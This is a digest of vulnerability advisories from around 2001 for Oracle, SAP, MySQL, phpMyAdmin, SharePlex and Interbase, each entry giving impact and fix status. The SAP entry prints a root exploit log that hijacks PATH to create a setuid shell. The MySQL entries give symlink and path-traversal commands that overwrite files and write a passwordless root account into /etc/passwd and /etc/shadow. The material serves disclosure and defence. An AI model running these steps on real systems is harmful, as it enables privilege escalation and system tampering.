Title: (Vendor Releases Fix) Re: Oracle's Application Desktop Integrator that Ships with Oracle's Financial Applications Gives Local Users Access to Database Passwords
Version(s): $link$; Any Oracle E-Business Suite Release 11i installation may be affected by this vulnerability, even if the ADI product is not being used.
Description:
It is reported that a specific version of Oracle's Application Desktop Integrator that ships with Oracle's Financial Applications contains a security vulnerability that allows local users to obtain database passwords.
It is reported that when the software is launched, it creates a file called dbg.txt on the host's local hard drive that contains the usernames and passwords for both the application user and the APPS schema in plain text.

It is reported that all access to the database for the financial applications is performed using the APPS schema.  As a result, the APPS schema has full control of all the tables within the database.

The problem is apparantly related to some code in fndpub11i.dll that was delivered with the 7.1.1.10.1 version. 

The vendor has reportedly been notified.
Impact': A local user can obtain usernames and passwords for the application user and the APPS schema.  With the password for the APPS schema, the user can obtain full control of the database tables.
Solution: The vendor has provided a fix.  See the Source Message for details on the how to obtain and apply the patch.

Title: Oracle's Application Desktop Integrator that Ships with Oracle's Financial Applications Gives Local Users Access to Database Passwords
Version(s): ADI v7.1.1.10.1 that ships with Oracle's Financial Applications version 11.5.3
Description:
It is reported that a specific version of Oracle's Application Desktop Integrator that ships with Oracle's Financial Applications contains a security vulnerability that allows local users to obtain database passwords.
It is reported that when the software is launched, it creates a file called dbg.txt on the host's local hard drive that contains the usernames and passwords for both the application user and the APPS schema in plain text.

It is reported that all access to the database for the financial applications is performed using the APPS schema.  As a result, the APPS schema has full control of all the tables within the database.

The problem is apparantly related to some code in fndpub11i.dll that was delivered with the 7.1.1.10.1 version. 

The vendor has reportedly been notified.
Impact': A local user can obtain usernames and passwords for the application user and the APPS schema.  With the password for the APPS schema, the user can obtain full control of the database tables.
Solution: No vendor solution was available at the time of this entry.

Title: SAP R/3 Web Application Server Demo Allows Local Users to Gain Root Level Access
Impact: Execution of arbitrary code via local system
Description:
It is reported that the Web Application Server demonstration program distributed with SAP R/3 contains a vulnerability that allows a local user to gain root level access.
The Web Application Server demo for Linux reportedly contains a vulnerable program /usr/sap/WAS/SYS/exe/run/saposcol that is configured with set userid (suid) root privileges.  The vulnerability is due to improper usage of popen(3).  As a result, it is reportedly possible for a local user to cause the application to execute arbitrary shell code on the server with root level privileges, allowing the local user to gain unauthorized root access.

The following notes depict the log of a successful root exploit:

   user@jupiter:~$ cat /tmp/expand
   #!/bin/sh
   cp /usr/bin/ksh /tmp/.sh
   chmod 4755 /tmp/.sh
   echo "done" > /tmp/blubber
   user@jupiter:~$ ls -l /tmp/.sh /tmp/blubber
   ls: /tmp/.sh: No such file or directory
   ls: /tmp/blubber: No such file or directory
   user@jupiter:~$ export PATH=/tmp:$PATH
   user@jupiter:~$ /usr/sap/WAS/SYS/exe/run/saposcol
   Starting collector (create new process)
   user@jupiter:~$ ls -l /tmp/.sh /tmp/blubber
   -rwsr-xr-x 1 root sapdb   162448   Apr 9 21:00 /tmp/.sh
   -rw-r--r-- 1 root sapdb        5   Apr 9 21:00 /tmp/blubber

The directory /usr/sap/WAS/SYS/exe/run is not protected with appropriate file permissions.
Impact': A local user may gain unauthorized root level access.
Solution:
The vendor has released a fix.  Version 1.5 of the saposcol program fixes this vulnerability and is available from: * sapserv* in /general/misc/linuxlab/saptools - you need access to SAP OSS.
* ftp.sap.com in /pub/linuxlab/saptools

Title: (Extensive Vulnerability Analysis and Summary) Re: Oracle 8 Contains a Denial of Service Condition That Allows Remote Users to Cause the Server to Consume All Available CPU Resources
Description:
It is reported that Oracle 8 contains a vulnerability that allows a remote user to cause the application to consume all CPU resources.
A user documents and analyzes various Oracle bugs.  See the source message or the following URL for the analysis:

http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html
Impact': A remote user can cause the server to consume all available CPU resources.
Solution: No solution was available at the time of this entry.

Title: phpPgAdmin Administration Tool for PostgreSQL Allows Remote Users to Execute Commands on the Server
Impact: Execution of arbitrary code via network
Description:
A vulnerability has been reported by Secure Reality in phpPgAdmin, an adminstration tool for PostgreSQL. The hole reportedly allows a remote user to execute commands on the server without authentication.
The report notes that all versions prior to and including v2.2.1 are likely to be vulnerable but were not tested.

No other details were provided in this preliminary advisory.
Impact': A remote user could execute commands on the phpPgAdmin server.
Solution: The vendor has released version 2.3 to correct the problem.

Title: phpMyAdmin Administration Tool for MySQL Allows Remote Users to Execute Commands on the Server
Impact: Execution of arbitrary code via network
Description:
A vulnerability has been reported by Secure Reality in phpMyAdmin, an adminstration tool for MySQL.   The hole reportedly allows a remote user to execute commands on the server without authentication.
The report notes that all versions prior to v2.1.0 are likely to be vulnerable but were not tested.

No other details were provided in this preliminary advisory.
Impact': A remote user could execute commands on the phpMyAdmin server.
Solution: No solution was available at the time of this entry.

Title: (A User Provides Additional Information) Re: Oracle 8 Contains a Denial of Service Condition That Allows Remote Users to Cause the Server to Consume All Available CPU Resources
Description:
It is reported that Oracle 8 contains a vulnerability that allows a remote user to cause the application to consume all CPU resources.
It is reported that the Oracle program TNSLSNR80.EXE can be made to consume all available CPU resources to the point that the host becomes unusable. This has reportedly been tested Oracle 8 servers running Windows NT 4.0 (SP6). The remote user is not required to authenticate to the server to be able to trigger the vulnerability. 

A user adds that there were various remote denial of service and other security vulnerabilities in Oracle tnslsnr in (at least) 8.1.6 and that this was reported to Oracle back in October 2000.  Apparently, 8.1.7 fixes the denial of service and most of the other security problems.  However, TNS 'query leaking' is still reportedly possible in 8.1.7 -- by sending tnslsnr a packet with a bogus length,
it's possible to see the contents of previous TNS packets, showing usernames and other oddities.
Impact': A remote user can cause the server to consume all available CPU resources.
Solution: No solution was available at the time of this entry.

Title: (A User Reports Solaris is Vulnerable Too) Re: Oracle 8 Contains a Denial of Service Condition That Allows Remote Users to Cause the Server to Consume All Available CPU Resources
Description:
It is reported that Oracle 8 contains a vulnerability that allows a remote user to cause the application to consume all CPU resources.
It is reported that the Oracle program TNSLSNR80.EXE can be made to consume all available CPU resources to the point that the host becomes unusable. This has reportedly been tested Oracle 8 servers running Windows NT 4.0 (SP6). The remote user is not required to authenticate to the server to be able to trigger the vulnerability.

A user reports that Oracle 8 running on Solaris 8 is also vulnerable.
Impact': A remote user can cause the server to consume all available CPU resources.
Solution: No solution was available at the time of this entry.

Title: Oracle 8 Contains a Denial of Service Condition That Allows Remote Users to Cause the Server to Consume All Available CPU Resources
Impact': A remote user can cause the server to consume all available CPU resources.
Solution: No solution was available at the time of this entry.

Title: Quest Software's SharePlex Database Replicator for Oracle Allows Local Users to Access Any File on the System
Description:
It has been reported that Quest Software's "SharePlex" product for Oracle database replication contains a security hole which can allow local users to read any file on the system.
When the product is installed, one of the installation programs contains a function called update_permissions() that assigns ownership of several application binaries to root and then sets permissions on them to read & execute by everyone with set userid root.  One of the tools that is installed with ownership/permission mode 4555 is "qview", used for cleaning out queues.

Qview's "cmd" command, which is used to execute qview commands stored in a file, will open any user-specified file and attempt to execute each line the file contains. Any errors encountered are echoed to standard output. A user who can execute qview can use this to gain unauthorized read access to any file on the system.  Because the target file will contain data other than qview commands, that data will be echoed out to stdout along with error messages.
Impact': A local user can read any file on the system.
Solution: No solution was available at the time of this entry.

Title: (Vendor Fix Released) Re: MySQL Database Allows Authorized Users to Modify Server Files to Deny Service or Obtain Additional Access
Impact: Denial of service via local system
Description:
It is reported that any local MySQL user can exploit MySQL to write files on the server with the privileges assigned to the MySQL server (which may be root-level privileges in some cases).  This can be used to gain additional access on the server.
The vendor has issued release 3.23.36 to correct several security issues.
Impact': An authorized local user can use MySQL to write files to the server in a denial of service attempt or in an attempt to obtain additional privileges.  If the MySQL daemon is run as root, then the user can obtain root-level privileges.
Solution: Check vendor web site for information on updated versions.

Title: Re: MySQL Database Allows Authorized Users to Modify Server Files to Deny Service or Obtain Additional Access
Impact: Denial of service via local system
Description:
It is reported that any local MySQL user can exploit MySQL to write files on the server with the privileges assigned to the MySQL server (which may be root-level privileges in some cases).  This can be used to gain additional access on the server.
A user reports that this vulnerabiltiy applies to mysql 3.23.32 [which is contrary to what the vendor has noted in a previous message].

This user tried the following commands:

mysql -u root ../../../../tmp
create table yikes(w int(4));

With these commands, the user was able to create:

/tmp/yikes.*
Impact': An authorized local user can use MySQL to write files to the server in a denial of service attempt or in an attempt to obtain additional privileges.  If the MySQL daemon is run as root, then the user can obtain root-level privileges.
Solution:
No solution was available at the time of this entry.  The author of the original source report makes several recommendations: 1) Patch MySQL to check all tablename files
2) Patch MySQL to treat database names beginning with ".." as invalid database names.
3) Do not run the MySQL daemon as root.

Title: Re: MySQL Database Allows Authorized Users to Modify Server Files to Deny Service or Obtain Additional Access
Impact: Denial of service via local system
Description:
It is reported that any local MySQL user can exploit MySQL to write files on the server with the privileges assigned to the MySQL server (which may be root-level privileges in some cases).  This can be used to gain additional access on the server.
One of the vendors writes to explain that the vulnerable version (3.20) is a very old version of MySQL and that the supported version is 3.23.x.  The vendor also notes that 3.23.1 (which was released more than a year ago) and the rest of the 3.23 branch does not contain this vulnerability.
Impact': An authorized local user can use MySQL to write files to the server in a denial of service attempt or in an attempt to obtain additional privileges.  If the MySQL daemon is run as root, then the user can obtain root-level privileges.
Solution: The vendor notes that this vulnerability was corrected over a year ago.  Version 3.23.x does not contain this bug.

Title: MySQL Database Allows Authorized Users to Modify Server Files to Deny Service or Obtain Additional Access
Impact: Denial of service via local system
Description:
It is reported that any local MySQL user can exploit MySQL to write files on the server with the privileges assigned to the MySQL server (which may be root-level privileges in some cases).  This can be used to gain additional access on the server.
MySQL reportedly accepts "../blah-blah" as a valid database name and table name (which is represented by 3 files: tablename.ISD, tablename.ISM and tablename.frm).  However, when MySQL determines if the table name already exists or not, it only checks "tablename.frm".

Some demonstration exploit steps were provided in the original source message to ...

1) Overwrite any file:

$ cd /var/tmp
$ ln -s /some/file/you/wish/to/owerwrite qqq.ISD
$ mysql -u user -h localhost -p somepassword '../../tmp'
create table qqq(www int);
\q
$
File /some/file/you/wish/to/overwrite will be overwritten.

2) To obtain root-level privileges (if MySQL daemon is run as root)

$ cd /var/tmp
$ ln -s /etc/passwd gotcha.ISD
$ ln -s /etc/shadow make_me_r00t.ISD
$ mysql -u user -h localhost -p somepassword '../../tmp'
create table gotcha(qqq varchar(255));
create table make_me_r00t(qqq varchar(255));
insert into gotcha values('\nr00t::0:0:Hacked_Fucked_R00T:/:/bin/sh\n');
insert into make_me_r00t values('\nr00t::1:0:99999:7:-1:-1:\n');
\q
$
Impact': An authorized local user can use MySQL to write files to the server in a denial of service attempt or in an attempt to obtain additional privileges.  If the MySQL daemon is run as root, then the user can obtain root-level privileges.
Solution:
No solution was available at the time of this entry.  The author of the original source report makes several recommendations: 1) Patch MySQL to check all tablename files
2) Patch MySQL to treat database names beginning with ".." as invalid database names.
3) Do not run the MySQL daemon as root.

Title: Interbase Database Server Contains Back Door Account
Version(s): Borland/Inprise Interbase 4.x and 5.x, Open source Interbase 6.0 and 6.01, Open source Firebird 0.9-3 and earlier
Description:
The Borland/Inprise Interbase database server, as well as the open source database package based on the Borland product, contains a back door account with a known static password.  The account is compiled in.
As reported in CERT Advisory CA-2001-01, the Interbase database server contains a compiled-in back door account.

The password and account are contained in both source code and the compiled binaries.  According to the report, the account name and password are readily retrievable.
Impact': Any user that can access port 3050/tcp [gds_db] on the target system can access and manipulate any database object on the system using the backdoor account.  Because the database runs with root privileges, any file on the system can be overwritten.  Trojan code can also be installed as stored procedures.
Solution: Download the vendor patch.  See the original message for more information.
